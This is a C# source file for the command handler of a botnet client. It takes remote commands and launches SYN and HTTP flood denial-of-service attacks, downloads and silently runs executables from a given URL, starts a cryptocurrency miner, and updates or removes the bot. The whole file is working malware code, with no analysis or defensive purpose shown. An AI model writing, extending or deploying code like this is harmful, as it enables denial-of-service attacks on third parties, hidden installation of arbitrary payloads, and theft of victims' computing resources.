using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using BotNet.DDoS;
using BotNet.Services.Common;
using BotNet.Services.Manager;

namespace BotNet.Services.Command
{
    public class CommandService : ICommandService
    {
        Factory _factoryService = new Factory();
        Bot _botService = new Bot();
        public void ExecuteCommand(string command)
        {
            string[] data = new string[0];
            try
            {
                data = command.Split(';');
            }
            catch { }

            switch (data[0])
            {
                case "ddossyn":
                    try
                    {
                        SYNFlood.Host = data[1];
                        SYNFlood.Port = ushort.Parse(data[2]);
                        SYNFlood.ISSockets = int.Parse(data[3]);
                        SYNFlood.ThreadsCount = int.Parse(data[4]);
                        SYNFlood.StartSYNFlood();
                    }
                    catch { }
                    break;
                case "ddoshttp":
                    try
                    {
                        HttpFlood.Host = data[1];
                        HttpFlood.ThreadCount = int.Parse(data[2]);
                        HttpFlood.StartHTTPFlood();
                    }
                    catch { }
                    break;
                case "downloadAndExecute":
                    try
                    {
                        WebClient client = new WebClient();
                        string tempName = _factoryService.GenString(new Random().Next(5, 12)) + ".exe";
                        string url = data[1];
                        if (!url.StartsWith("http://")) { url = "http://" + url; }
                        client.DownloadFile(url, Environment.GetEnvironmentVariable("TEMP") + @"\" + tempName);
                        Process process = new Process();
                        process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + @"\" + tempName;
                        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        process.Start();
                    }
                    catch { }
                    break;
                case "visit":
                    try
                    {
                        string sURL = data[1];
                        if (!sURL.StartsWith("http://")) { sURL = "http://" + sURL; }
                        GET(sURL);
                    }
                    catch (Exception e) { }
                    break;
                case "miner":
                    try
                    {
                        Miner.Start();
                        Config.IsMine = true;
                    }
                    catch {}
                    break;
                case "update":
                    try
                    {
                        string sURL = data[1];
                        if (!sURL.StartsWith("http://")) { sURL = "http://" + sURL; }
                        _botService.UpdateBot(sURL);
                    }
                    catch { }
                    break;
                case "remove":
                    if ((data[1] == Config.PCName) || (data[1].ToUpper() == "ALL"))
                    {
                        Miner.Remove();
                        _botService.RemoveBot();
                    }
                    break;
                case "stop":
                    try { SYNFlood.StopSYNFlood(); } catch { }
                    try { HttpFlood.StopHTTPFlood(); } catch { }
                    //try { UDPFlood.StopUDPFlood(); } catch { }
                    //try { ICMPFlood.StopICMPFlood(); } catch { }
                    try { Miner.Stop();} catch { }
                    break;
            }
        }

        private string GET(string url)
        {
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
            req.Method = "GET";
            req.ContentType = "application/x-www-form-urlencoded";
            WebResponse resp = req.GetResponse();
            string Out = "";
            using (Stream stream = resp.GetResponseStream())
            {
                using (StreamReader sr = new StreamReader(stream))
                {
                    Out = sr.ReadToEnd();
                }
            }
            return Out;
        }
    }
}
